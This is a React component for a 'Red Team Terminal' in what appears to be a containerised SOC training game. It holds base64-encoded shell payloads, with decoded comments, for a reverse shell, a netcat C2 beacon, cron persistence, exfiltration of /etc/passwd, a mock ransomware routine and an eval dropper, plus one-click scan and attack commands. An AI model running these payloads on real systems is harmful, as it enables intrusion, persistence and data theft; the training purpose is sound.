import { useState, useRef, useEffect } from "react";

const PRESET_ATTACKS = [
  { label: "🔍 Recon: Network Scan", container: "soc-attacker", command: "nmap -sn 172.20.0.0/24" },
  { label: "🔍 Recon: Port Scan Victim", container: "soc-attacker", command: "nmap -sV victim" },
  { label: "🐚 Reverse Shell", container: "soc-victim", command: "bash /tmp/reverse_shell.sh attacker 4444 &" },
  { label: "📡 C2 Beacon", container: "soc-victim", command: "bash /tmp/beacon.sh attacker 4444 5 &" },
  { label: "🔒 Cron Persistence", container: "soc-victim", command: "bash /tmp/persistence_cron.sh attacker 4444" },
  { label: "💀 Ransomware Sim", container: "soc-victim", command: "bash /tmp/ransomware_sim.sh /tmp" },
  { label: "📤 Exfiltrate Data", container: "soc-victim", command: "bash /tmp/exfiltrate.sh attacker 9999" },
  { label: "💉 Dropper", container: "soc-victim", command: "bash /tmp/dropper.sh" },
];

// Pre-built malware payloads (base64-encoded shell scripts)
const MALWARE_PAYLOADS = [
  {
    label: "Reverse Shell",
    name: "reverse_shell.sh",
    // #!/bin/bash\nbash -i >& /dev/tcp/attacker/4444 0>&1
    payload: "IyEvYmluL2Jhc2gKYmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjE=",
    obfuscation: "base64"
  },
  {
    label: "C2 Beacon",
    name: "beacon.sh",
    // #!/bin/bash\nwhile true; do nc -w 2 attacker 4444 -e /bin/bash 2>/dev/null; sleep 5; done
    payload: "IyEvYmluL2Jhc2gKd2hpbGUgdHJ1ZTsgZG8gbmMgLXcgMiBhdHRhY2tlciA0NDQ0IC1lIC9iaW4vYmFzaCAyPi9kZXYvbnVsbDsgc2xlZXAgNTsgZG9uZQ==",
    obfuscation: "base64"
  },
  {
    label: "Cron Persistence",
    name: "persistence_cron.sh",
    // #!/bin/bash\n(crontab -l 2>/dev/null; echo "*/5 * * * * nc -w 2 attacker 4444 -e /bin/bash") | crontab -
    payload: "IyEvYmluL2Jhc2gKKGNyb250YWIgLWwgMj4vZGV2L251bGw7IGVjaG8gIiovNSAqICogKiAqIG5jIC13IDIgYXR0YWNrZXIgNDQ0NCAtZSAvYmluL2Jhc2giKSB8IGNyb250YWIgLQ==",
    obfuscation: "base64"
  },
  {
    label: "Ransomware Sim",
    name: "ransomware_sim.sh",
    // #!/bin/bash\necho "RANSOM: Your files are encrypted!"\nfor f in /tmp/*.txt; do [ -f "$f" ] && cp "$f" "${f}.encrypted"; done
    payload: "IyEvYmluL2Jhc2gKZWNobyAiUkFOU09NOiBZb3VyIGZpbGVzIGFyZSBlbmNyeXB0ZWQhIgpmb3IgZiBpbiAvdG1wLyoudHh0OyBkbyBbIC1mICIkZiIgXSAmJiBjcCAiJGYiICIke2Z9LmVuY3J5cHRlZCI7IGRvbmU=",
    obfuscation: "base64"
  },
  {
    label: "Exfiltration",
    name: "exfiltrate.sh",
    // #!/bin/bash\ntar czf /tmp/exfil_data.tar.gz /etc/passwd /etc/hostname 2>/dev/null\ncat /tmp/exfil_data.tar.gz | nc -w 5 attacker 9999
    payload: "IyEvYmluL2Jhc2gKdGFyIGN6ZiAvdG1wL2V4ZmlsX2RhdGEudGFyLmd6IC9ldGMvcGFzc3dkIC9ldGMvaG9zdG5hbWUgMj4vZGV2L251bGwKY2F0IC90bXAvZXhmaWxfZGF0YS50YXIuZ3ogfCBuYyAtdyA1IGF0dGFja2VyIDk5OTk=",
    obfuscation: "base64"
  },
  {
    label: "Dropper (Obfuscated)",
    name: "dropper.sh",
    // #!/bin/bash\nPAYLOAD=$(echo 'IyEvYmluL2Jhc2gKd2hvYW1p' | base64 -d)\neval "$PAYLOAD"
    payload: "IyEvYmluL2Jhc2gKUEFZTE9BRD0kKGVjaG8gJ0l5RXZZbWx1TDJKaGMyZ0tkMmh2WVcxcCcgfCBiYXNlNjQgLWQpCmV2YWwgIiRQQVlMT0FEIg==",
    obfuscation: "base64"
  },
];

export default function RedTeamPanel({ onExecute, onUploadMalware, history }) {
  const [command, setCommand] = useState("");
  const [container, setContainer] = useState("soc-attacker");
  const [running, setRunning] = useState(false);
  const [activeTab, setActiveTab] = useState("terminal"); // terminal | payloads | presets
  const [uploadStatus, setUploadStatus] = useState(null);
  const outputRef = useRef(null);
  const inputRef = useRef(null);

  useEffect(() => {
    if (outputRef.current) {
      outputRef.current.scrollTop = outputRef.current.scrollHeight;
    }
  }, [history]);

  async function handleSubmit(e) {
    e.preventDefault();
    if (!command.trim() || running) return;
    setRunning(true);
    try {
      await onExecute(container, command.trim());
    } finally {
      setRunning(false);
      setCommand("");
      inputRef.current?.focus();
    }
  }

  async function handlePreset(preset) {
    if (running) return;
    setRunning(true);
    try {
      await onExecute(preset.container, preset.command);
    } finally {
      setRunning(false);
    }
  }

  async function handleUpload(malware) {
    if (running) return;
    setRunning(true);
    setUploadStatus(null);
    try {
      const result = await onUploadMalware(
        malware.name,
        malware.payload,
        malware.obfuscation,
        "/tmp/" + malware.name
      );
      setUploadStatus({
        success: result.success,
        message: result.success
          ? `✅ ${malware.name} uploaded to ${result.filePath} (+${result.points} pts)`
          : `❌ Upload failed: ${result.error || result.reason}`
      });
    } catch (err) {
      setUploadStatus({ success: false, message: `❌ ${err.message}` });
    } finally {
      setRunning(false);
    }
  }

  return (
    <section className="panel red-team-panel">
      <header className="panel-header panel-header-red">
        <h3>🔴 Red Team Terminal</h3>
        <div className="red-tabs">
          <button
            className={`tab-btn ${activeTab === "terminal" ? "active" : ""}`}
            onClick={() => setActiveTab("terminal")}
          >Terminal</button>
          <button
            className={`tab-btn ${activeTab === "payloads" ? "active" : ""}`}
            onClick={() => setActiveTab("payloads")}
          >Payloads</button>
          <button
            className={`tab-btn ${activeTab === "presets" ? "active" : ""}`}
            onClick={() => setActiveTab("presets")}
          >Quick Attacks</button>
        </div>
      </header>

      {activeTab === "terminal" && (
        <>
          <div className="terminal-output" ref={outputRef}>
            {(!history || history.length === 0) && (
              <div className="terminal-welcome">
                <p>Red Team terminal ready. Execute commands on attacker/victim containers.</p>
                <p className="hint">Examples:</p>
                <p className="hint">  nmap -sn 172.20.0.0/24</p>
                <p className="hint">  echo beacon | nc -w 2 victim 4444</p>
                <p className="hint">  echo '#!/bin/bash' &gt; /tmp/payload.sh</p>
              </div>
            )}
            {history && history.map((entry) => (
              <div key={entry.id} className={`terminal-entry ${entry.success ? "success" : "error"}`}>
                <div className="terminal-cmd">
                  <span className="terminal-prompt">{entry.container}#</span>
                  <span className="terminal-command">{entry.command}</span>
                  {entry.points > 0 && <span className="terminal-pts">+{entry.points}</span>}
                </div>
                {entry.output && <pre className="terminal-stdout">{entry.output}</pre>}
                {entry.error && <pre className="terminal-stderr">{entry.error}</pre>}
              </div>
            ))}
          </div>
          <form className="terminal-input-bar" onSubmit={handleSubmit}>
            <select
              className="container-select"
              value={container}
              onChange={(e) => setContainer(e.target.value)}
            >
              <option value="soc-attacker">attacker</option>
              <option value="soc-victim">victim</option>
            </select>
            <span className="terminal-prompt-input">$</span>
            <input
              ref={inputRef}
              className="terminal-input"
              type="text"
              value={command}
              onChange={(e) => setCommand(e.target.value)}
              placeholder={running ? "Running..." : "Enter command..."}
              disabled={running}
              autoFocus
            />
            <button className="btn-execute" type="submit" disabled={running || !command.trim()}>
              {running ? "⏳" : "▶"}
            </button>
          </form>
        </>
      )}

      {activeTab === "payloads" && (
        <div className="payloads-panel">
          <p className="payloads-info">Upload malware payloads to the victim container. Each payload is base64-encoded and written to /tmp/.</p>
          {uploadStatus && (
            <div className={`upload-status ${uploadStatus.success ? "upload-ok" : "upload-fail"}`}>
              {uploadStatus.message}
            </div>
          )}
          <div className="payload-grid">
            {MALWARE_PAYLOADS.map((m) => (
              <button
                key={m.name}
                className="btn-payload"
                disabled={running}
                onClick={() => handleUpload(m)}
              >
                <span className="payload-label">{m.label}</span>
                <span className="payload-name">{m.name}</span>
                <span className="payload-obf">obf: {m.obfuscation}</span>
              </button>
            ))}
          </div>
        </div>
      )}

      {activeTab === "presets" && (
        <div className="presets-panel">
          <p className="presets-info">One-click attack commands. Payloads must be uploaded first (use Payloads tab).</p>
          <div className="preset-grid">
            {PRESET_ATTACKS.map((p, i) => (
              <button
                key={i}
                className="btn-preset"
                disabled={running}
                onClick={() => handlePreset(p)}
              >
                <span className="preset-label">{p.label}</span>
                <span className="preset-cmd">{p.command}</span>
                <span className="preset-target">on {p.container.replace("soc-", "")}</span>
              </button>
            ))}
          </div>
        </div>
      )}
    </section>
  );
}
